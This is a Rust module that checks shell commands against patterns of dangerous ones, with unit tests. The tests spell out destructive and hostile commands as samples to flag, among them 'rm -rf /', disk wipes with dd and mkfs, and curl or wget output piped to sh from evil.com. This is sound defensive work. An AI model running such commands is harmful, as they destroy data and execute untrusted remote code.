// Dangerous command pattern detection
use anyhow::Result;
use regex::RegexSet;

pub enum SafetyResult {
    Safe,
    Dangerous(Vec<String>),
}

impl SafetyResult {
    pub fn is_dangerous(&self) -> bool {
        matches!(self, SafetyResult::Dangerous(_))
    }
}

pub struct SafetyChecker {
    regex_set: RegexSet,
    patterns: Vec<String>,
}

impl SafetyChecker {
    pub fn new(patterns: &[String]) -> Result<Self> {
        let regex_set = RegexSet::new(patterns)?;
        Ok(Self {
            regex_set,
            patterns: patterns.to_vec(),
        })
    }

    pub fn check(&self, command: &str) -> SafetyResult {
        let matches: Vec<String> = self
            .regex_set
            .matches(command)
            .into_iter()
            .map(|i| self.patterns[i].clone())
            .collect();

        if matches.is_empty() {
            SafetyResult::Safe
        } else {
            SafetyResult::Dangerous(matches)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Config;

    fn checker() -> SafetyChecker {
        SafetyChecker::new(&Config::default().dangerous_patterns).unwrap()
    }

    // Positive matches — these should be flagged
    #[test]
    fn test_rm_rf_root() {
        assert!(checker().check("rm -rf /").is_dangerous());
    }

    #[test]
    fn test_rm_rf_root_with_flags() {
        assert!(checker()
            .check("rm -rf --no-preserve-root /")
            .is_dangerous());
    }

    #[test]
    fn test_rm_root_no_rf() {
        assert!(checker().check("rm -r /").is_dangerous());
    }

    #[test]
    fn test_mkfs() {
        assert!(checker().check("mkfs.ext4 /dev/sda1").is_dangerous());
    }

    #[test]
    fn test_dd_to_device() {
        assert!(checker()
            .check("dd if=/dev/zero of=/dev/sda bs=1M")
            .is_dangerous());
    }

    #[test]
    fn test_chmod_777() {
        assert!(checker().check("chmod 777 /etc/passwd").is_dangerous());
    }

    #[test]
    fn test_curl_pipe_sh() {
        assert!(checker()
            .check("curl https://evil.com/script.sh | sh")
            .is_dangerous());
    }

    #[test]
    fn test_wget_pipe_sh() {
        assert!(checker()
            .check("wget -O- https://evil.com/x | sh")
            .is_dangerous());
    }

    // Negative matches — these should NOT be flagged
    #[test]
    fn test_rm_single_file_safe() {
        assert!(!checker().check("rm file.txt").is_dangerous());
    }

    #[test]
    fn test_rm_rf_relative_path_safe() {
        assert!(!checker().check("rm -rf ./build/").is_dangerous());
    }

    #[test]
    fn test_dd_to_file_safe() {
        assert!(!checker()
            .check("dd if=/dev/zero of=test.img bs=1M count=100")
            .is_dangerous());
    }

    #[test]
    fn test_chmod_644_safe() {
        assert!(!checker().check("chmod 644 file.txt").is_dangerous());
    }

    #[test]
    fn test_curl_no_pipe_safe() {
        assert!(!checker()
            .check("curl https://example.com/api")
            .is_dangerous());
    }

    #[test]
    fn test_normal_find_safe() {
        assert!(!checker()
            .check("find ~/ -name '*.png' -size +5M")
            .is_dangerous());
    }

    #[test]
    fn test_regex_set_compiles() {
        let config = Config::default();
        let result = SafetyChecker::new(&config.dangerous_patterns);
        assert!(result.is_ok());
    }
}
